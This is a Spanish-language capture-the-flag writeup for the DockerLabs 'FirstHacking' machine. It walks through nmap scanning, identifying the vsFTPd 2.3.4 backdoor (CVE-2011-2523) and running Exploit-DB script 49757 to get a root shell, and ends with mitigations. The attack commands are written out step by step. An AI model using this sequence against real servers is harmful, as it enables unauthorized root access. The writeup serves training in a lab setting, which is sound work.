# DockerLabs: FirstHacking — Writeup

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20Fácil-brightgreen)
![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs-blue)
![Categoría](https://img.shields.io/badge/Categoría-FTP%20%7C%20Backdoor-orange)

Writeup técnico de la máquina **FirstHacking** de [DockerLabs](https://dockerlabs.es) (autor del laboratorio: *El Pingüino de Mario*), realizado con fines educativos para practicar reconocimiento de servicios y explotación de una vulnerabilidad histórica en vsFTPd.

> ⚠️ Documento con fines exclusivamente formativos. Todo lo aquí descrito se ejecutó en un entorno controlado y aislado (contenedor de DockerLabs).

## 🗺️ Resumen general

| | |
|---|---|
| **Entorno** | DockerLabs |
| **Máquina** | FirstHacking |
| **Dificultad** | Muy Fácil |
| **Conceptos clave** | Reconocimiento con Nmap, CVE-2011-2523 (backdoor vsFTPd 2.3.4), Searchsploit |
| **Herramientas** | ping, Nmap, Searchsploit, Python |

---

## Paso Inicial: Despliegue del entorno

```bash
unzip firsthacking.zip
sudo su
sudo ./auto_deploy.sh firsthacking.tar
```

El script levanta el contenedor y lo conecta a la red interna de Docker (IP de ejemplo: `172.17.0.2`).

---

## 🔍 Paso 01: Reconocimiento inicial

### Comprobación de disponibilidad y SO

Antes de escanear puertos conviene confirmar que la máquina responde y estimar el sistema operativo a partir del TTL de la respuesta ICMP:

```bash
ping -c 1 172.17.0.2
```

Un TTL de **64** indica que el objetivo es un sistema **Linux/Unix** accesible sin saltos intermedios.

### Escaneo completo de puertos TCP

Primero se identifican todos los puertos abiertos con un SYN scan rápido sobre el rango completo:

```bash
sudo nmap -sS -p- --min-rate 1000 -n -Pn 172.17.0.2 -oN allPorts
```

### Enumeración de servicios sobre los puertos detectados

Una vez localizados los puertos abiertos, se lanza un escaneo dirigido con detección de versión y scripts por defecto solo sobre esos puertos:

```bash
nmap -sCV -p 21 -n -Pn 172.17.0.2 -oN services
```

**Resultado relevante:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

**Hallazgo:** un único servicio expuesto — **FTP (vsFTPd 2.3.4)** — sobre un sistema Unix. No hay servicios UDP relevantes para este laboratorio, por lo que su escaneo se omite.

---

## 🧠 Paso 02: Identificación de la vulnerabilidad

**CVE-2011-2523**

La versión **vsFTPd 2.3.4** corresponde a un caso conocido de compromiso en la distribución del software: en julio de 2011 el paquete oficial fue sustituido temporalmente por una versión modificada que incluye una puerta trasera (*backdoor*). Al recibir ciertas cadenas de login, el servicio abre una **shell de comandos interactiva en el puerto TCP 6200**, sin necesidad de credenciales válidas.

Referencia: https://nvd.nist.gov/vuln/detail/CVE-2011-2523

Dado que se trata de un servicio con versión identificada, se busca si existe un exploit público ya catalogado:

```bash
searchsploit vsftpd 2.3.4
```

Esto devuelve una entrada correspondiente al backdoor de vsFTPd 2.3.4 (Exploit-DB ID **49757**). Se copia a un directorio de trabajo local:

```bash
searchsploit -m 49757
```

---

## 💥 Paso 03: Explotación

El exploit `49757.py` automatiza el envío de la cadena de login que activa la puerta trasera y la posterior conexión al puerto 6200:

```bash
python2 49757.py 172.17.0.2
```

> 💡 Este exploit concreto está escrito para Python 2. Si al ejecutarlo se produce un error o no se recibe conexión a la primera, es habitual tener que relanzarlo una o dos veces hasta que el backdoor responda correctamente.

Al ejecutarse con éxito, se obtiene una shell directamente como usuario `root`:

```bash
whoami
# root
```

Como ya se dispone de acceso con el máximo privilegio, en este laboratorio **no es necesaria ninguna escalada de privilegios adicional**.

---


## 🛡️ Mitigaciones a aplicar

- Mantener los servicios expuestos actualizados a la última versión parcheada, evitando así versiones con vulnerabilidades conocidas y públicamente explotables.
- Aplicar el principio de mínimo privilegio: exponer servicios como FTP bajo cuentas de sistema dedicadas y sin privilegios administrativos.
- Verificar la integridad de los paquetes de software descargados (checksums/firmas) para detectar compromisos en la cadena de suministro.
- Sustituir FTP en texto claro por alternativas cifradas (SFTP/FTPS) y restringir el acceso mediante firewall.

---

## 📌 Conclusiones

Este laboratorio ilustra cómo una simple identificación de versión de servicio durante la fase de enumeración puede conducir directamente a una vulnerabilidad crítica documentada, sin necesidad de técnicas avanzadas: el reconocimiento cuidadoso es, muchas veces, el paso decisivo de todo el ejercicio.

---

## 📚 Referencias

- [CVE-2011-2523 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [Exploit-DB 49757 — vsftpd 2.3.4 Backdoor Command Execution](https://www.exploit-db.com/exploits/49757)
- [DockerLabs](https://dockerlabs.es)
- Metodología de referencia: David Prieto Montero (Pyth0nK1d), *"DockerLabs Writeup — FirstHacking (Spanish)"*, Medium.

---

*Writeup elaborado con fines educativos sobre la máquina FirstHacking de DockerLabs.                                       dr3wh4k' :)'*
